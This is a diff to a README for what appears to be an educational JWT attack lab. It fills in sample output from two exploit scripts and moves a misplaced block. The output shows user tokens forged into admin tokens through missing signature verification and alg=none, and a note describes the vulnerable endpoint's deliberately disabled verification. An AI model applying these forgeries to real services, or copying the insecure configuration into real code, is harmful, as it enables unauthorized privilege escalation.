@@ -90,7 +90,26 @@ python exploits/01_missing_verification.py
 
 ### Output
 
-*(Coming soon - will be filled with real output once the exploit is implemented)*
+```
+============================================================
+ATTACK 1 - Missing signature verification
+============================================================
+
+[1] Logging in as 'user'...
+    Token received: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c...
+
+[2] Original payload: {'sub': 'user', 'role': 'user', 'exp': 1781708472}
+
+[3] Forged payload:   {'sub': 'admin', 'role': 'admin', 'exp': 1781708472}
+
+[4] Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ...
+
+[5] Sending forged token to /vuln/no-verify...
+
+[6] Server response: {'message': 'Welcome, admin! Your role is: admin', 'payload': {'sub': 'admin', 'role': 'admin', 'exp': 1781708472}}
+
+[!] ATTACK SUCCESSFUL - Server accepted a token with a fake signature
+```
 
 ---
 
@@ -120,7 +139,30 @@ python exploits/02_alg_none.py
 
 ### Output
 
-*(Coming soon)*
+```
+============================================================
+ATTACK 2 - alg=none
+============================================================
+
+[1] Logging in as 'user'...
+    Token received: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c...
+
+[2] Original payload: {'sub': 'user', 'role': 'user', 'exp': 1781708989}
+
+[3] Forged payload:   {'sub': 'admin', 'role': 'admin', 'exp': 1781708989}
+
+[4] Forged token (alg=none, no signature): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG...
+    Header:  {'alg': 'none', 'typ': 'JWT'}
+    Note: token ends with a dot - the signature part is empty
+
+[5] Sending forged token to /vuln/alg-none...
+
+[6] Server response: {'message': 'Welcome, admin! Your role is: admin', 'payload': {'sub': 'admin', 'role': 'admin', 'exp': 1781708989}}
+
+[!] ATTACK SUCCESSFUL - Server accepted a token with no signature
+```
+
+> **Note on the implementation:** In a real vulnerable server, the only flaw would be accepting `none` in the algorithms list - `algorithms=["HS256", "none"]`. Modern PyJWT rejects `alg=none` even when listed, so our vulnerable endpoint also sets `verify_signature: False` as a workaround to simulate the behavior of older or misconfigured libraries. The conceptual bug is the same: never accept `none` as a valid algorithm.
 
 ---
 
@@ -205,27 +247,6 @@ python exploits/05_alg_confusion.py
 ```
 
 ### Output
-
-```
-============================================================
-ATTACK 1 - Missing signature verification
-============================================================
-
-[1] Logging in as 'user'...
-    Token received: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c...
-
-[2] Original payload: {'sub': 'user', 'role': 'user', 'exp': 1781708472}
-
-[3] Forged payload:   {'sub': 'admin', 'role': 'admin', 'exp': 1781708472}
-
-[4] Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ...
-
-[5] Sending forged token to /vuln/no-verify...
-
-[6] Server response: {'message': 'Welcome, admin! Your role is: admin', 'payload': {'sub': 'admin', 'role': 'admin', 'exp': 1781708472}}
-
-[!] ATTACK SUCCESSFUL - Server accepted a token with a fake signature
-```
 
 ---
 
